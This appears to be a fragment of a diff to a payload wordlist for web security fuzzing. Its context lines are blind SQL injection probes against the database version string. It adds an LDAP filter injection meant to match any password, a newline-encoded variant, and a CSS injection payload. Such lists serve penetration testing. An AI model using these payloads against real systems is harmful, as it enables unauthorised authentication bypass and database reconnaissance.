@@ -462,3 +462,6 @@ and (select substring(@@version,2,1))='y'
 and (select substring(@@version,3,1))='c'
 and (select substring(@@version,3,1))='S'
 and (select substring(@@version,3,1))='X'
+admin)(|(password=*)
+admin)(%0a|(password=*)
+%0a*{}%0abody{background:red}%0a/
